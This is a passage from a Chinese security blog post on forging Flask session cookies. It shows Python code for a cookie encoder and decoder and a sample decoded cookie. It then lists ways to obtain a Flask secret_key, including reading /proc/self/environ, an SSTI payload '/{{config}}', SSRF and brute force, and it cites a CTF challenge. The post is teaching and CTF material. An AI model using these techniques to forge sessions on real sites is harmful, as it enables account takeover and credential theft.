</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">payload</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">session_cookie_value</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">if</span> <span style="color:#58a1dd">payload</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">startswith</span>(<span style="color:#a6be9d">&#39;.&#39;</span>):
</span></span><span style="display:flex;"><span>                        <span style="color:#58a1dd">compressed</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">True</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#58a1dd">payload</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">payload</span>[<span style="color:#a6be9d">1</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">data</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">payload</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">split</span>(<span style="color:#a6be9d">&#34;.&#34;</span>)[<span style="color:#a6be9d">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">data</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">base64_decode</span>(<span style="color:#58a1dd">data</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">if</span> <span style="color:#58a1dd">compressed</span>:
</span></span><span style="display:flex;"><span>                        <span style="color:#58a1dd">data</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">zlib</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">decompress</span>(<span style="color:#58a1dd">data</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">data</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">else</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">app</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">MockApp</span>(<span style="color:#58a1dd">secret_key</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">si</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">SecureCookieSessionInterface</span>()
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">si</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get_signing_serializer</span>(<span style="color:#58a1dd">app</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">s</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">loads</span>(<span style="color:#58a1dd">session_cookie_value</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">except</span> <span style="color:#58a1dd">Exception</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">e</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">return</span> <span style="color:#a6be9d">&#34;[Decoding error] </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">e</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">raise</span> <span style="color:#58a1dd">e</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">else</span>: <span style="color:#828b96;font-style:italic"># &gt; 3.4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">class</span> <span style="color:#58a1dd">FSCM</span>(<span style="color:#58a1dd">ABC</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">def</span> <span style="color:#58a1dd">encode</span>(<span style="color:#58a1dd">secret_key</span>, <span style="color:#58a1dd">session_cookie_structure</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#a6be9d">&#34;&#34;&#34; Encode a Flask session cookie &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">try</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">app</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">MockApp</span>(<span style="color:#58a1dd">secret_key</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">session_cookie_structure</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">ast</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">literal_eval</span>(<span style="color:#58a1dd">session_cookie_structure</span>))
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">si</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">SecureCookieSessionInterface</span>()
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">si</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get_signing_serializer</span>(<span style="color:#58a1dd">app</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">return</span> <span style="color:#58a1dd">s</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dumps</span>(<span style="color:#58a1dd">session_cookie_structure</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">except</span> <span style="color:#58a1dd">Exception</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">e</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">return</span> <span style="color:#a6be9d">&#34;[Encoding error] </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">e</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">raise</span> <span style="color:#58a1dd">e</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">def</span> <span style="color:#58a1dd">decode</span>(<span style="color:#58a1dd">session_cookie_value</span>, <span style="color:#58a1dd">secret_key</span><span style="color:#ff636f">=</span><span style="color:#ff636f">None</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#a6be9d">&#34;&#34;&#34; Decode a Flask cookie  &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">try</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">if</span>(<span style="color:#58a1dd">secret_key</span><span style="color:#ff636f">==</span><span style="color:#ff636f">None</span>):
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">compressed</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">False</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">payload</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">session_cookie_value</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">if</span> <span style="color:#58a1dd">payload</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">startswith</span>(<span style="color:#a6be9d">&#39;.&#39;</span>):
</span></span><span style="display:flex;"><span>                        <span style="color:#58a1dd">compressed</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">True</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#58a1dd">payload</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">payload</span>[<span style="color:#a6be9d">1</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">data</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">payload</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">split</span>(<span style="color:#a6be9d">&#34;.&#34;</span>)[<span style="color:#a6be9d">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">data</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">base64_decode</span>(<span style="color:#58a1dd">data</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">if</span> <span style="color:#58a1dd">compressed</span>:
</span></span><span style="display:flex;"><span>                        <span style="color:#58a1dd">data</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">zlib</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">decompress</span>(<span style="color:#58a1dd">data</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">data</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">else</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">app</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">MockApp</span>(<span style="color:#58a1dd">secret_key</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">si</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">SecureCookieSessionInterface</span>()
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">si</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get_signing_serializer</span>(<span style="color:#58a1dd">app</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">s</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">loads</span>(<span style="color:#58a1dd">session_cookie_value</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">except</span> <span style="color:#58a1dd">Exception</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">e</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">return</span> <span style="color:#a6be9d">&#34;[Decoding error] </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">e</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">raise</span> <span style="color:#58a1dd">e</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">__name__</span> <span style="color:#ff636f">==</span> <span style="color:#a6be9d">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">FSCM</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">decode</span>(<span style="color:#a6be9d">&#34;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn3eg.zBDV4huj8XGiRbFjSPMZq1HeV5Y&#34;</span>))</span></span></code></pre></div><h5 id="重要文件" class="heading-element"><span>0.0.0.3  重要文件</span>
  <a href="#%e9%87%8d%e8%a6%81%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><pre tabindex="0"><code>/proc/self/environ  #环境变量</code></pre><h5 id="拿secret_key" class="heading-element"><span>0.0.0.4  拿secret_key</span>
  <a href="#%e6%8b%bfsecret_key" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><p>通常情况下获取 <code>secret_key</code> 的方法有以下几种：</p>
<ul>
<li>网站某处泄露获取</li>
<li>通过 SSTI 漏洞获取，如 <code>/{{config}}</code></li>
<li>通过 SSRF 读取存在 <code>secret_key</code> 的 Flask 配置文件或读取 /proc/self/environ 获取</li>
<li>爆破</li>
</ul>
<p><code>2018HCTF WEB admin(session伪造、unicode漏洞、条件竞争)</code></p>
<p><a href="https://www.cnblogs.com/xhds/p/12287085.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/xhds/p/12287085.html</a></p></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/python%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Python安全">Python安全</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/python%E5%AE%89%E5%85%A8/32/" class="post-nav-item" rel="prev" title="Python SSTI Bypass"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Python SSTI Bypass</a>
      <a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/python%E5%AE%89%E5%85%A8/30/" class="post-nav-item" rel="next" title="Python Pickle反序列化">Python Pickle反序列化<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
